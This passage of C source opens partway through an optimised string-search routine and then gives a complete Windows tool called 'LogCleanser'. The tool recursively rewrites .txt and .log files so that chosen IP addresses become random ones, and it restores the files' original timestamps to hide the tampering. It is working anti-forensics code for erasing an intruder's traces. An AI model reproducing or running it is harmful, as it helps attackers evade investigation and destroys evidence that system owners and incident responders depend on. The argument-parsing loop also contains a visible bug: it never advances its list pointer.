			if ( *(uint32_t *)&pbTarget[i-(PRIMALposition-1)] == *(uint32_t *)(pbPattern-(PRIMALposition-1))) { // This fast check ensures not missing a match (for remainder) when going under 0 in loop below:
			count = PRIMALlengthCANDIDATE-4+1;
			while ( count > 0 && *(uint32_t *)(pbPattern-(PRIMALposition-1)+count-1) == *(uint32_t *)(&pbTarget[i-(PRIMALposition-1)]+(count-1)) )
			count = count-4;
			if ( count <= 0 ) return(pbTarget+i-(PRIMALposition-1));
			}
			}
			}
			}
			}
			} else Gulliver = cbPattern-(2-1);
			i = i + Gulliver;
			//GlobalI++; // Comment it, it is only for stats.
			}
			return(NULL);
			}
			*/
			// Revision 2 commented section ]

			if (cbPattern <= NeedleThreshold2vs4swampLITE) {

				// BMH order 2, needle should be >=4:
				ulHashPattern = *(uint32_t *)(pbPattern); // First four bytes
				for (i = 0; i < 256 * 256; i++) { bm_Horspool_Order2[i] = 0; }
				for (i = 0; i < cbPattern - 1; i++) bm_Horspool_Order2[*(unsigned short *)(pbPattern + i)] = 1;
				i = 0;
				while (i <= cbTarget - cbPattern) {
					Gulliver = 1; // 'Gulliver' is the skip
					if (bm_Horspool_Order2[*(unsigned short *)&pbTarget[i + cbPattern - 1 - 1]] != 0) {
						if (bm_Horspool_Order2[*(unsigned short *)&pbTarget[i + cbPattern - 1 - 1 - 2]] == 0) Gulliver = cbPattern - (2 - 1) - 2; else {
							if (*(uint32_t *)&pbTarget[i] == ulHashPattern) { // This fast check ensures not missing a match (for remainder) when going under 0 in loop below:
								count = cbPattern - 4 + 1;
								while (count > 0 && *(uint32_t *)(pbPattern + count - 1) == *(uint32_t *)(&pbTarget[i] + (count - 1)))
									count = count - 4;

								//if (cbPattern != PRIMALlengthCANDIDATE) { // No need of same comparison when Needle and NewNeedle are equal!
								// If we miss to hit then no need to compare the original: Needle
								if (count <= 0) {
									// I have to add out-of-range checks...
									// i-(PRIMALposition-1) >= 0
									// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
									// i-(PRIMALposition-1)+(count-1) >= 0
									// &pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4

									// "FIX" from 2014-Apr-27:
									// Because (count-1) is negative, above fours are reduced to next twos:
									// i-(PRIMALposition-1)+(count-1) >= 0
									// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
									// The line below is BUGGY:
									//if ( (i-(PRIMALposition-1) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) && (&pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4) ) {
									// The line below is NOT OKAY, in fact so stupid, grrr, not a blunder, not carelessness, but overconfidence in writing "on the fly":
									//if ( ((signed int)(i-(PRIMALposition-1)+(count-1)) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) ) {
									// FIX from 2016-Aug-10 (two times failed to do simple boundary checks, pfu):
									if (((signed int)(i - (PRIMALposition - 1)) >= 0) && (&pbTarget[i - (PRIMALposition - 1)] + ((PRIMALlengthCANDIDATE - 4 + 1) - 1) <= pbTargetMax - 4)) {
										if (*(uint32_t *)&pbTarget[i - (PRIMALposition - 1)] == *(uint32_t *)(pbPattern - (PRIMALposition - 1))) { // This fast check ensures not missing a match (for remainder) when going under 0 in loop below:
											count = PRIMALlengthCANDIDATE - 4 + 1;
											while (count > 0 && *(uint32_t *)(pbPattern - (PRIMALposition - 1) + count - 1) == *(uint32_t *)(&pbTarget[i - (PRIMALposition - 1)] + (count - 1)))
												count = count - 4;
											if (count <= 0) return(pbTarget + i - (PRIMALposition - 1));
										}
									}
								}
								//} else { //if (cbPattern != PRIMALlengthCANDIDATE)
								//						if ( count <= 0 ) return(pbTarget+i);
								//}
							}
						}
					}
					else Gulliver = cbPattern - (2 - 1);
					i = i + Gulliver;
					//GlobalI++; // Comment it, it is only for stats.
				}
				return(NULL);

			}
			else { // if ( cbPattern<=NeedleThreshold2vs4swampLITE )

				// BMH pseudo-order 4, needle should be >=8+2:
				ulHashPattern = *(uint32_t *)(pbPattern); // First four bytes
				for (i = 0; i < 256 * 256; i++) { bm_Horspool_Order2[i] = 0; }
				// In line below we "hash" 4bytes to 2bytes i.e. 16bit table, how to compute TOTAL number of BBs, 'cbPattern - Order + 1' is the number of BBs for text 'cbPattern' bytes long, for example, for cbPattern=11 'fastest fox' and Order=4 we have BBs = 11-4+1=8:
				//"fast"
				//"aste"
				//"stes"
				//"test"
				//"est "
				//"st f"
				//"t fo"
				//" fox"
				//for (i=0; i < cbPattern-4+1; i++) bm_Horspool_Order2[( *(unsigned short *)(pbPattern+i+0) + *(unsigned short *)(pbPattern+i+2) ) & ( (1<<16)-1 )]=1;
				//for (i=0; i < cbPattern-4+1; i++) bm_Horspool_Order2[( (*(uint32_t *)(pbPattern+i+0)>>16)+(*(uint32_t *)(pbPattern+i+0)&0xFFFF) ) & ( (1<<16)-1 )]=1;
				// Above line is replaced by next one with better hashing:
				for (i = 0; i < cbPattern - 4 + 1; i++) bm_Horspool_Order2[((*(uint32_t *)(pbPattern + i + 0) >> (16 - 1)) + (*(uint32_t *)(pbPattern + i + 0) & 0xFFFF)) & ((1 << 16) - 1)] = 1;
				i = 0;
				while (i <= cbTarget - cbPattern) {
					Gulliver = 1;
					//if ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2]>>16)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2]&0xFFFF) ) & ( (1<<16)-1 )] != 0 ) { // DWORD #1
					// Above line is replaced by next one with better hashing:
					if (bm_Horspool_Order2[((*(uint32_t *)&pbTarget[i + cbPattern - 1 - 1 - 2] >> (16 - 1)) + (*(uint32_t *)&pbTarget[i + cbPattern - 1 - 1 - 2] & 0xFFFF)) & ((1 << 16) - 1)] != 0) { // DWORD #1
						//if ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]>>16)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) ) & ( (1<<16)-1 )] == 0 ) Gulliver = cbPattern-(2-1)-2-4; else {
						// Above line is replaced in order to strengthen the skip by checking the middle DWORD,if the two DWORDs are 'ab' and 'cd' i.e. [2x][2a][2b][2c][2d] then the middle DWORD is 'bc'.
						// The respective offsets (backwards) are: -10/-8/-6/-4 for 'xa'/'ab'/'bc'/'cd'.
						//if ( ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]>>16)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]&0xFFFF) ) & ( (1<<16)-1 )] ) + ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]>>16)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) ) & ( (1<<16)-1 )] ) + ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]>>16)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]&0xFFFF) ) & ( (1<<16)-1 )] ) < 3 ) Gulliver = cbPattern-(2-1)-2-4-2; else {
						// Above line is replaced by next one with better hashing:
						// When using (16-1) right shifting instead of 16 we will have two different pairs (if they are equal), the highest bit being lost do the job especialy for ASCII texts with no symbols in range 128-255.
						// Example for genomesque pair TT+TT being shifted by (16-1):
						// T            = 01010100
						// TT           = 01010100 01010100
						// TTTT         = 01010100 01010100 01010100 01010100
						// TTTT>>16     = 00000000 00000000 01010100 01010100
						// TTTT>>(16-1) = 00000000 00000000 10101000 10101000 <--- Due to the left shift by 1, the 8th bits of 1st and 2nd bytes are populated - usually they are 0 for English texts & 'ACGT' data.
						//if ( ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]>>(16-1))+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]&0xFFFF) ) & ( (1<<16)-1 )] ) + ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]>>(16-1))+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) ) & ( (1<<16)-1 )] ) + ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]>>(16-1))+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]&0xFFFF) ) & ( (1<<16)-1 )] ) < 3 ) Gulliver = cbPattern-(2-1)-2-4-2; else {
						// 'Maximus' uses branched 'if', again.
						if (\
							(bm_Horspool_Order2[((*(uint32_t *)&pbTarget[i + cbPattern - 1 - 1 - 2 - 6 + 1] >> (16 - 1)) + (*(uint32_t *)&pbTarget[i + cbPattern - 1 - 1 - 2 - 6 + 1] & 0xFFFF)) & ((1 << 16) - 1)]) == 0 \
							|| (bm_Horspool_Order2[((*(uint32_t *)&pbTarget[i + cbPattern - 1 - 1 - 2 - 4 + 1] >> (16 - 1)) + (*(uint32_t *)&pbTarget[i + cbPattern - 1 - 1 - 2 - 4 + 1] & 0xFFFF)) & ((1 << 16) - 1)]) == 0 \
							) Gulliver = cbPattern - (2 - 1) - 2 - 4 - 2 + 1; else {
							// Above line is not optimized (several a SHR are used), we have 5 non-overlapping WORDs, or 3 overlapping WORDs, within 4 overlapping DWORDs so:
							// [2x][2a][2b][2c][2d]
							// DWORD #4
							// [2a] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]>>16) =     !SHR to be avoided! <--
							// [2x] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]&0xFFFF) =                        |
							//     DWORD #3                                                                       |
							// [2b] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]>>16) =     !SHR to be avoided!   |<--
							// [2a] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) = ------------------------  |
							//         DWORD #2                                                                      |
							// [2c] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]>>16) =     !SHR to be avoided!      |<--
							// [2b] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]&0xFFFF) = ---------------------------  |
							//             DWORD #1                                                                     |
							// [2d] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-0]>>16) =                                 |
							// [2c] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-0]&0xFFFF) = ------------------------------
							//
							// So in order to remove 3 SHR instructions the equal extractions are:
							// DWORD #4
							// [2a] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) =  !SHR to be avoided! <--
							// [2x] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]&0xFFFF) =                        |
							//     DWORD #3                                                                       |
							// [2b] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]&0xFFFF) =  !SHR to be avoided!   |<--
							// [2a] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) = ------------------------  |
							//         DWORD #2                                                                      |
							// [2c] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-0]&0xFFFF) =  !SHR to be avoided!      |<--
							// [2b] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]&0xFFFF) = ---------------------------  |
							//             DWORD #1                                                                     |
							// [2d] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-0]>>16) =                                 |
							// [2c] (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-0]&0xFFFF) = ------------------------------
							//if ( ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-6]&0xFFFF) ) & ( (1<<16)-1 )] ) + ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]&0xFFFF)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) ) & ( (1<<16)-1 )] ) + ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-0]&0xFFFF)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-2]&0xFFFF) ) & ( (1<<16)-1 )] ) < 3 ) Gulliver = cbPattern-(2-1)-2-6; else {
							// Since the above Decumanus mumbo-jumbo (3 overlapping lookups vs 2 non-overlapping lookups) is not fast enough we go DuoDecumanus or 3x4:
							// [2y][2x][2a][2b][2c][2d]
							// DWORD #3
							//         DWORD #2
							//                 DWORD #1
							//if ( ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]>>16)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-4]&0xFFFF) ) & ( (1<<16)-1 )] ) + ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-8]>>16)+(*(uint32_t *)&pbTarget[i+cbPattern-1-1-2-8]&0xFFFF) ) & ( (1<<16)-1 )] ) < 2 ) Gulliver = cbPattern-(2-1)-2-8; else {
							if (*(uint32_t *)&pbTarget[i] == ulHashPattern) {
								// Order 4 [
								// Let's try something "outrageous" like comparing with[out] overlap BBs 4bytes long instead of 1 byte back-to-back:
								// Inhere we are using order 4, 'cbPattern - Order + 1' is the number of BBs for text 'cbPattern' bytes long, for example, for cbPattern=11 'fastest fox' and Order=4 we have BBs = 11-4+1=8:
								//0:"fast" if the comparison failed here, 'count' is 1; 'Gulliver' is cbPattern-(4-1)-7
								//1:"aste" if the comparison failed here, 'count' is 2; 'Gulliver' is cbPattern-(4-1)-6
								//2:"stes" if the comparison failed here, 'count' is 3; 'Gulliver' is cbPattern-(4-1)-5
								//3:"test" if the comparison failed here, 'count' is 4; 'Gulliver' is cbPattern-(4-1)-4
								//4:"est " if the comparison failed here, 'count' is 5; 'Gulliver' is cbPattern-(4-1)-3
								//5:"st f" if the comparison failed here, 'count' is 6; 'Gulliver' is cbPattern-(4-1)-2
								//6:"t fo" if the comparison failed here, 'count' is 7; 'Gulliver' is cbPattern-(4-1)-1
								//7:" fox" if the comparison failed here, 'count' is 8; 'Gulliver' is cbPattern-(4-1)
								count = cbPattern - 4 + 1;
								// Below comparison is UNIdirectional:
								while (count > 0 && *(uint32_t *)(pbPattern + count - 1) == *(uint32_t *)(&pbTarget[i] + (count - 1)))
									count = count - 4;

								//if (cbPattern != PRIMALlengthCANDIDATE) { // No need of same comparison when Needle and NewNeedle are equal!
								// count = cbPattern-4+1 = 23-4+1 = 20
								// boomshakalakaZZZZZZ[ZZZZ] 20
								// boomshakalakaZZ[ZZZZ]ZZZZ 20-4
								// boomshakala[kaZZ]ZZZZZZZZ 20-8 = 12
								// boomsha[kala]kaZZZZZZZZZZ 20-12 = 8
								// boo[msha]kalakaZZZZZZZZZZ 20-16 = 4

								// If we miss to hit then no need to compare the original: Needle
								if (count <= 0) {
									// I have to add out-of-range checks...
									// i-(PRIMALposition-1) >= 0
									// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
									// i-(PRIMALposition-1)+(count-1) >= 0
									// &pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4

									// "FIX" from 2014-Apr-27:
									// Because (count-1) is negative, above fours are reduced to next twos:
									// i-(PRIMALposition-1)+(count-1) >= 0
									// &pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4
									// The line below is BUGGY:
									//if ( (i-(PRIMALposition-1) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) && (&pbTarget[i-(PRIMALposition-1)+(count-1)] <= pbTargetMax - 4) ) {
									// The line below is NOT OKAY, in fact so stupid, grrr, not a blunder, not carelessness, but overconfidence in writing "on the fly":
									//if ( ((signed int)(i-(PRIMALposition-1)+(count-1)) >= 0) && (&pbTarget[i-(PRIMALposition-1)] <= pbTargetMax - 4) ) {
									// FIX from 2016-Aug-10 (two times failed to do simple boundary checks, pfu):
									if (((signed int)(i - (PRIMALposition - 1)) >= 0) && (&pbTarget[i - (PRIMALposition - 1)] + ((PRIMALlengthCANDIDATE - 4 + 1) - 1) <= pbTargetMax - 4)) {
										if (*(uint32_t *)&pbTarget[i - (PRIMALposition - 1)] == *(uint32_t *)(pbPattern - (PRIMALposition - 1))) { // This fast check ensures not missing a match (for remainder) when going under 0 in loop below:
											count = PRIMALlengthCANDIDATE - 4 + 1;
											while (count > 0 && *(uint32_t *)(pbPattern - (PRIMALposition - 1) + count - 1) == *(uint32_t *)(&pbTarget[i - (PRIMALposition - 1)] + (count - 1)))
												count = count - 4;
											if (count <= 0) return(pbTarget + i - (PRIMALposition - 1));
										}
									}
								}
								//} else { //if (cbPattern != PRIMALlengthCANDIDATE)
								//						if ( count <= 0 ) return(pbTarget+i);
								//}

								// In order to avoid only-left or only-right WCS the memcmp should be done as left-to-right and right-to-left AT THE SAME TIME.
								// Below comparison is BIdirectional. It pays off when needle is 8+++ long:
								//							for (count = cbPattern-4+1; count > 0; count = count-4) {
								//								if ( *(uint32_t *)(pbPattern+count-1) != *(uint32_t *)(&pbTarget[i]+(count-1)) ) {break;};
								//								if ( *(uint32_t *)(pbPattern+(cbPattern-4+1)-count) != *(uint32_t *)(&pbTarget[i]+(cbPattern-4+1)-count) ) {count = (cbPattern-4+1)-count +(1); break;} // +(1) because two lookups are implemented as one, also no danger of 'count' being 0 because of the fast check outwith the 'while': if ( *(uint32_t *)&pbTarget[i] == ulHashPattern)
								//							}
								//							if ( count <= 0 ) return(pbTarget+i);
								// Checking the order 2 pairs in mismatched DWORD, all the 3:
								//if ( bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+count-1]] == 0 ) Gulliver = count; // 1 or bigger, as it should
								//if ( bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+count-1+1]] == 0 ) Gulliver = count+1; // 1 or bigger, as it should
								//if ( bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+count-1+1+1]] == 0 ) Gulliver = count+1+1; // 1 or bigger, as it should
								//	if ( bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+count-1]] + bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+count-1+1]] + bm_Horspool_Order2[*(unsigned short *)&pbTarget[i+count-1+1+1]] < 3 ) Gulliver = count; // 1 or bigger, as it should, THE MIN(count,count+1,count+1+1)
								// Above compound 'if' guarantees not that Gulliver > 1, an example:
								// Needle:    fastest tax
								// Window: ...fastast tax...
								// After matching ' tax' vs ' tax' and 'fast' vs 'fast' the mismathced DWORD is 'test' vs 'tast':
								// 'tast' when factorized down to order 2 yields: 'ta','as','st' - all the three when summed give 1+1+1=3 i.e. Gulliver remains 1.
								// Roughly speaking, this attempt maybe has its place in worst-case scenarios but not in English text and even not in ACGT data, that's why I commented it in original 'Shockeroo'.
								//if ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+count-1]>>16)+(*(uint32_t *)&pbTarget[i+count-1]&0xFFFF) ) & ( (1<<16)-1 )] == 0 ) Gulliver = count; // 1 or bigger, as it should
								// Above line is replaced by next one with better hashing:
								//								if ( bm_Horspool_Order2[( (*(uint32_t *)&pbTarget[i+count-1]>>(16-1))+(*(uint32_t *)&pbTarget[i+count-1]&0xFFFF) ) & ( (1<<16)-1 )] == 0 ) Gulliver = count; // 1 or bigger, as it should
								// Order 4 ]
							}
						}
					}
					else Gulliver = cbPattern - (2 - 1) - 2; // -2 because we check the 4 rightmost bytes not 2.
					i = i + Gulliver;
					//GlobalI++; // Comment it, it is only for stats.
				}
				return(NULL);

			} // if ( cbPattern<=NeedleThreshold2vs4swampLITE )
		} // if ( cbPattern<=NeedleThreshold2vs4swampLITE )
	} //if ( cbPattern<4 )
}

void usage()
{
	Output("LogCleanser v0.1 by skyer@t00ls.net\n\n");
	Output("Usage:\n\tLogCleanser.exe /path/to/log/dir <ip1> [ip2] ...\n");
	Output("Example:\n\tLogCleanser.exe C:\\logs 1.1.1.1 2.2.2.2 3.3.3.3\n");
	ExitProcess(0);
}

bool dirExists(const char* dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in);
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}

bool checkip(char *ip)
{
	IN_ADDR tmp;
	int result = inet_pton(AF_INET, ip, &tmp);

	return result == 1;
}

char *dupstr(char *s)
{
	if (s)
	{
		char *buf = (char *)alloc(lstrlenA(s) + 1);
		lstrcpyA(buf, s);
		return buf;
	}else
		return 0;
}

_RtlGenRandom pRtlGenRandom;

unsigned int GetRandByLen(unsigned int size)
{
	unsigned int r = 0;
	pRtlGenRandom(&r, 4);
	switch (size)
	{
	case 1:
		return r % 10;
	case 2:
		return r % 100;
	case 3:
		return r % 255;
	default:
		return 0;
	}
}

char *GenerateRandomIP(unsigned int size)
{
	if (size >6)
	{
		char tmpIP[16];
		RtlSecureZeroMemory(tmpIP, 16);
		unsigned int p1l=1, p2l =1, p3l =1, p4l = 1;
		unsigned int fr = size - 7;

		if (fr)
		{
			if (fr>2)
			{
				p1l += 2;
				fr -= 2;

				if (fr>2)
				{
					p2l += 2;
					fr -= 2;
					if (fr>2)
					{
						p3l += 2;
						fr -= 2;
						if (fr>0)
						{
							p4l += fr;
						}
					}
					else
					{
						p3l += fr;
					}
				}
				else
				{
					p2l += fr;
				}
			}
			else
			{
				p1l += fr;
			}
		}

		wsprintfA(tmpIP, "%d.%d.%d.%d", GetRandByLen(p1l), GetRandByLen(p2l), GetRandByLen(p3l), GetRandByLen(p4l));
		return dupstr(tmpIP);
	}
	else
	{
		return 0;
	}
}

void Cleanse(char *dir, char *cFileName, PipNode ipList)
{
	char *fpath = (char *)alloc(lstrlenA(dir) + lstrlenA(cFileName) + 2);
	lstrcpyA(fpath, dir);
	lstrcatA(fpath, "\\");
	lstrcatA(fpath, cFileName);

	Output("Current: %s\n", fpath);
	HANDLE hlog = CreateFileA(fpath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hlog != INVALID_HANDLE_VALUE)
	{
		FILETIME cTime, aTime, wTime;
		GetFileTime(hlog, &cTime, &aTime, &wTime);

		PipNode p = ipList;

		DWORD size = GetFileSize(hlog, 0);
		HANDLE hmap = CreateFileMappingA(hlog, 0, PAGE_READWRITE, 0, size, 0);

		if (hmap)
		{
			char *map = (char*)MapViewOfFile(hmap, FILE_MAP_ALL_ACCESS, 0, 0, size);

			if (map)
			{
				while (p && p->ip)
				{
					char *pFind = Railgun_Swampshine_BailOut(map, p->ip, size, p->size);
					while (pFind)
					{
						char *newIP = GenerateRandomIP(p->size);
						Output("%s --> %s\n", p->ip, newIP);
						unsigned int newsize = lstrlenA(newIP);

						for (unsigned int i = 0; i < newsize; i++)
						{
							*(pFind + i) = *(newIP + i);
						}

						for (unsigned int i = newsize; i < p->size; i++)
						{
							if (*(pFind + i) != ' ')
							{
								*(pFind + i) = ' ';
							}
						}

						mfree(newIP);
						unsigned int pos = pFind - map; // 修订位置 继续往后遍历
						pFind = Railgun_Swampshine_BailOut(pFind, p->ip, size - pos, p->size);
					}

					p = p->next;
				}

				FlushViewOfFile(map, size); // 强制系统将修改过的数据部分或全部重新写入磁盘映像，从而可以确保所有的数据更新能及时保存到磁盘
				UnmapViewOfFile(map); // 从进程的地址空间撤消文件数据映像
			}
			CloseHandle(hmap);
		}

		SetFileTime(hlog, &cTime, &aTime, &wTime);
	}

	CloseHandle(hlog);

	if (fpath)
	{
		mfree(fpath);
	}
}

void loopDirAndCleanse(char *dir, PipNode ipList)
{
	// Cleanse txt file
	char *tmpdir = (char *)alloc(lstrlenA(dir) + 8);
	lstrcpyA(tmpdir, dir);
	lstrcatA(tmpdir, "\\*.txt");

	WIN32_FIND_DATAA fData;

	HANDLE hfind = FindFirstFileA(tmpdir, &fData);

	if (hfind !=INVALID_HANDLE_VALUE)
	{
		Cleanse(dir, fData.cFileName , ipList);
	}

	while (FindNextFileA(hfind, &fData))
	{
		Cleanse(dir, fData.cFileName, ipList);
	}

	FindClose(hfind);

	// Cleanse log file
	RtlSecureZeroMemory(tmpdir, lstrlenA(dir) + 8);
	lstrcpyA(tmpdir, dir);
	lstrcatA(tmpdir, "\\*.log");

	hfind = FindFirstFileA(tmpdir, &fData);

	if (hfind != INVALID_HANDLE_VALUE)
	{
		Cleanse(dir, fData.cFileName, ipList);
	}

	while (FindNextFileA(hfind, &fData))
	{
		Cleanse(dir, fData.cFileName, ipList);
	}

	FindClose(hfind);

	// Loop directory recursively.

	RtlSecureZeroMemory(tmpdir, lstrlenA(dir) + 8);
	lstrcpyA(tmpdir, dir);
	lstrcatA(tmpdir, "\\*");

	hfind = FindFirstFileA(tmpdir, &fData);

	if (hfind != INVALID_HANDLE_VALUE && lstrcmpA(fData.cFileName, ".") && lstrcmpA(fData.cFileName, "..") && (fData.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY))
	{
		char *nPath = (char *)alloc(lstrlenA(dir) + lstrlenA(fData.cFileName) + 1);
		lstrcpyA(nPath, dir);
		lstrcatA(nPath, "\\");
		lstrcatA(nPath, fData.cFileName);

		loopDirAndCleanse(nPath, ipList);
		mfree(nPath);
	}

	while (FindNextFileA(hfind, &fData))
	{
		if (fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lstrcmpA(fData.cFileName, ".") && lstrcmpA(fData.cFileName, ".."))
			{
				char *nPath = (char *)alloc(lstrlenA(dir) + lstrlenA(fData.cFileName) + 2);
				lstrcpyA(nPath, dir);
				lstrcatA(nPath, "\\");
				lstrcatA(nPath, fData.cFileName);

				loopDirAndCleanse(nPath, ipList);
				mfree(nPath);
			}
		}
	}

	FindClose(hfind);

	mfree(tmpdir);
}

PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = lstrlenA(CmdLine);
	i = ((len + 2) / 2)*sizeof(PVOID)+sizeof(PVOID);

	argv = (PCHAR*)alloc(i + (len + 2)*sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}

void main()
{
	int _Argc = 0;
	char ** _Argv = CommandLineToArgvA(GetCommandLineA(), &_Argc);

	if (_Argc < 2)
	{
		usage();
	}

	char *logdir = _Argv[1];

	if (!dirExists(logdir))
	{
		Output("Directory %s NOT exist!\n", logdir);
		usage();
	}
	else
	{
		Output("Working directory: %s\n" ,logdir);
	}

	PipNode p = (PipNode)alloc(sizeof(ipNode));
	PipNode ipList = p;

	for (int i = 2; i < _Argc; i++)
	{
		if (checkip(_Argv[i]))
		{
			p->ip = dupstr(_Argv[i]);
			p->size = lstrlenA(p->ip);
			p->next = (PipNode)alloc(sizeof(ipNode));
		}
		else
		{
			Output("WARNING: Ignoring ip %s (Bad ip)!\n", _Argv[i]);
		}
	}

	if (!ipList->ip)
	{
		usage();
	}

	pRtlGenRandom = (_RtlGenRandom)GetProcAddress(LoadLibrary(L"advapi32.dll"), "SystemFunction036");

	loopDirAndCleanse(logdir, ipList); // 这个函数是递归的

	p = ipList;

	while (p)
	{
		PipNode t = p;
		p = p->next;
		mfree(t);
	}

	Output("All done.\n");
}